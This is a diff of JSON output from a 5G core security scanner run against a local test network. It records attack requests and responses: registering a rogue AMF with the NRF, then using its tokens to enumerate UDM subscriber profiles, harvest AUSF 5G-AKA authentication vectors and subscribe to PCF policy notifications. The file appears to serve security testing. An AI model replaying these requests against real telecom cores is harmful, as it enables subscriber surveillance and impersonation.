@@ -1,106 +1,14 @@
 {
-  "tool": "5GProbe",
+  "tool": "5G Scanner",
+  "mode": "scan",
   "target": "http://localhost:9000",
-  "timestamp": "2026-04-14T15:15:53.378862+00:00",
+  "timestamp": "2026-04-14T15:38:23.635023+00:00",
   "findings": [
-    {
-      "check_id": "CHECK-001",
-      "name": "Unauthenticated NRF Enumeration",
-      "status": "PATCHED",
-      "affected_nf": "NRF",
-      "endpoint": "GET /nnrf-nfm/v1/nf-instances",
-      "evidence": "NRF returned 401 Unauthorized",
-      "conclusion": "OAuth enforcement active. Unauthenticated enumeration blocked.",
-      "request": {
-        "method": "GET",
-        "url": "http://localhost:9000/nnrf-nfm/v1/nf-instances",
-        "headers": {
-          "Authorization": "none"
-        }
-      },
-      "response": {
-        "status_code": 401,
-        "body": "{\"error\":\"verify OAuth Authorization header invalid\"}"
-      }
-    },
-    {
-      "check_id": "CHECK-002",
-      "name": "Rogue NF Registration",
-      "status": "VULNERABLE",
-      "affected_nf": "NRF",
-      "endpoint": "PUT /nnrf-nfm/v1/nf-instances/{nfInstanceId}",
-      "evidence": "NRF accepted rogue NF registration with status 200",
-      "conclusion": "NRF registered our fake AMF with no identity verification. Attacker can now obtain legitimate OAuth tokens and impersonate a trusted NF across the entire 5G Core.",
-      "request": {
-        "method": "PUT",
-        "url": "http://localhost:9000/nnrf-nfm/v1/nf-instances/12345678-1234-1234-1234-123456789012",
-        "body": {
-          "nfInstanceId": "12345678-1234-1234-1234-123456789012",
-          "nfType": "AMF",
-          "nfStatus": "REGISTERED",
-          "ipv4Addresses": [
-            "127.0.0.99"
-          ],
-          "allowedNfTypes": [
-            "AMF",
-            "SMF",
-            "UDM",
-            "AUSF",
-            "PCF",
-            "NRF"
-          ],
-          "nfServices": [
-            {
-              "serviceInstanceId": "5361f9b8-eb2c-444b-8ef3-848c7472a5b2",
-              "serviceName": "namf-comm",
-              "versions": [
-                {
-                  "apiVersionInUri": "v1",
-                  "apiFullVersion": "1.0.0"
-                }
-              ],
-              "scheme": "http",
-              "nfServiceStatus": "REGISTERED",
-              "ipEndPoints": [
-                {
-                  "ipv4Address": "127.0.0.99",
-                  "port": 8000
-                }
-              ]
-            }
-          ]
-        }
-      },
-      "response": {
-        "status_code": 200,
-        "body": "{\"allowedNfTypes\":[\"AMF\",\"SMF\",\"UDM\",\"AUSF\",\"PCF\",\"NRF\"],\"customInfo\":{\"oauth2\":true},\"ipv4Addresses\":[\"127.0.0.99\"],\"nfInstanceId\":\"12345678-1234-1234-1234-123456789012\",\"nfServices\":[{\"ipEndPoints\":[{\"ipv4Address\":\"127.0.0.99\",\"port\":8000}],\"nfServiceStatus\":\"REGISTERED\",\"scheme\":\"http\",\"serviceInstanceId\":\"5361f9b8-eb2c-444b-8ef3-848c7472a5b2\",\"serviceName\":\"namf-comm\",\"versions\":[{\"apiFullVersion\":\"1.0.0\",\"apiVersionInUri\":\"v1\"}]}],\"nfStatus\":\"REGISTERED\",\"nfType\":\"AMF\",\"plmnList\":[{\"mcc\":\"2"
-      }
-    },
-    {
-      "check_id": "CHECK-003",
-      "name": "Cross-Service Token Abuse",
-      "status": "PATCHED",
-      "affected_nf": "NRF",
-      "endpoint": "GET /nnrf-disc/v1/nf-instances",
-      "evidence": "NRF returned 401 \u2014 scope mismatch detected",
-      "conclusion": "Cross-service token abuse blocked in v4.2.1. Scope enforcement is working correctly.",
-      "request": {
-        "method": "GET",
-        "url": "http://localhost:9000/nnrf-disc/v1/nf-instances",
-        "headers": {
-          "Authorization": "Bearer <token scoped for nudm-sdm>"
-        },
-        "note": "Token scoped for UDM used to call NRF discovery"
-      },
-      "response": {
-        "status_code": 401,
-        "body": "{\"error\":\"OAuth scope verification failed: insufficient permissions\"}"
-      }
-    },
     {
       "check_id": "CHECK-004",
       "name": "UDM Subscriber Enumeration",
       "status": "VULNERABLE",
+      "severity": "CRITICAL",
       "affected_nf": "UDM",
       "endpoint": "GET /nudm-sdm/v2/{supi}/am-data",
       "evidence": "UDM returned subscriber profile for imsi-208930000000001 to rogue AMF",
@@ -118,96 +26,6 @@
       "response": {
         "status_code": 200,
         "body": "{\"gpsis\":[\"msisdn-\"],\"subscribedUeAmbr\":{\"uplink\":\"1 Gbps\",\"downlink\":\"2 Gbps\"},\"nssai\":{\"defaultSingleNssais\":[{\"sst\":1,\"sd\":\"010203\"}],\"singleNssais\":[{\"sst\":1,\"sd\":\"112233\"}]}}"
-      }
-    },
-    {
-      "check_id": "CHECK-005",
-      "name": "AMF UE Context Unauthorized Access",
-      "status": "REQUIRES_UE",
-      "affected_nf": "AMF",
-      "endpoint": "GET /namf-comm/v1/ue-contexts/{ueContextId}",
-      "evidence": "No active UE context found in AMF",
-      "conclusion": "CHECK-005 requires an active UE registration. No real UE connected \u2014 cannot fully evaluate. Run with a UE simulator to complete this check.",
-      "request": {
-        "method": "GET",
-        "url": "http://localhost:9018/namf-comm/v1/ue-contexts/imsi-208930000000001",
-        "headers": {
-          "Authorization": "Bearer <rogue SMF token scoped for namf-comm>"
-        }
-      },
-      "response": {
-        "status_code": 404,
-        "body": "404 page not found"
-      }
-    },
-    {
-      "check_id": "CHECK-006",
-      "name": "AUSF Auth Vector Harvesting",
-      "status": "VULNERABLE",
-      "affected_nf": "AUSF",
-      "endpoint": "POST /nausf-auth/v1/ue-authentications",
-      "evidence": "AUSF returned 5G-AKA auth vectors for imsi-208930000000001 to rogue AMF",
-      "conclusion": "AUSF does not verify that the requesting AMF is currently serving this subscriber. Any rogue NF with a valid token can harvest authentication vectors \u2014 RAND, HXRES*, AUTN \u2014 for any subscriber. Enables network impersonation and SIM key material analysis.",
-      "request": {
-        "method": "POST",
-        "url": "http://localhost:9009/nausf-auth/v1/ue-authentications",
-        "headers": {
-          "Authorization": "Bearer <rogue AMF token scoped for nausf-auth>"
-        },
-        "body": {
-          "supiOrSuci": "imsi-208930000000001",
-          "servingNetworkName": "5G:mnc093.mcc208.3gppnetwork.org"
-        }
-      },
-      "response": {
-        "status_code": 201,
-        "body": "{\"authType\":\"5G_AKA\",\"5gAuthData\":{\"rand\":\"dbc4fdec469b908c0fa3a0c4e33fd98b\",\"hxresStar\":\"444dc4f94feddca4a9280d59a7480fbb\",\"autn\":\"2c34352b0fc68000467c817637deb429\"},\"_links\":{\"5g-aka\":[{\"href\":\"http://127.0.0.9:8000/nausf-auth/v1/ue-authentications/imsi-208930000000001/5g-aka-confirmation\"}]},\"servingNetworkName\":\"5G:mnc093.mcc208.3gppnetwork.org\"}"
-      }
-    },
-    {
-      "check_id": "CHECK-007",
-      "name": "SMF Session Enumeration",
-      "status": "REQUIRES_UE",
-      "affected_nf": "SMF",
-      "endpoint": "GET /nsmf-pdusession/v1/sm-contexts",
-      "evidence": "No active PDU session found in SMF",
-      "conclusion": "CHECK-007 requires an active PDU session. No real UE connected \u2014 cannot fully evaluate. Run with a UE simulator to complete this check.",
-      "request": {
-        "method": "GET",
-        "url": "http://localhost:9002/nsmf-pdusession/v1/sm-contexts/imsi-208930000000001",
-        "headers": {
-          "Authorization": "Bearer <rogue AMF token scoped for nsmf-pdusession>"
-        }
-      },
-      "response": {
-        "status_code": 404,
-        "body": "404 page not found"
-      }
-    },
-    {
-      "check_id": "CHECK-008",
-      "name": "PCF Policy Unauthorized Access",
-      "status": "VULNERABLE",
-      "affected_nf": "PCF",
-      "endpoint": "POST /npcf-am-policy-control/v1/policies",
-      "evidence": "PCF accepted policy context creation for imsi-208930000000001 from rogue AMF. Notification URI set to rogue NF at 127.0.0.99",
-      "conclusion": "PCF does not verify that the requesting AMF is currently serving this subscriber. Rogue NF registered as policy consumer \u2014 will receive real-time policy notifications. Enables subscriber surveillance and potential QoS manipulation.",
-      "request": {
-        "method": "POST",
-        "url": "http://localhost:9007/npcf-am-policy-control/v1/policies",
-        "headers": {
-          "Authorization": "Bearer <rogue AMF token scoped for npcf-am-policy-control>"
-        },
-        "body": {
-          "notificationUri": "http://127.0.0.99:8000/callback",
-          "supi": "imsi-208930000000001",
-          "pei": "imeisv-1110000000000000",
-          "ipv4Address": "10.60.0.1"
-        }
-      },
-      "response": {
-        "status_code": 201,
-        "body": "{\"request\":{\"notificationUri\":\"http://127.0.0.99:8000/callback\",\"supi\":\"imsi-208930000000001\",\"pei\":\"imeisv-1110000000000000\",\"suppFeat\":\"\"},\"suppFeat\":\"\"}"
       }
     }
   ]
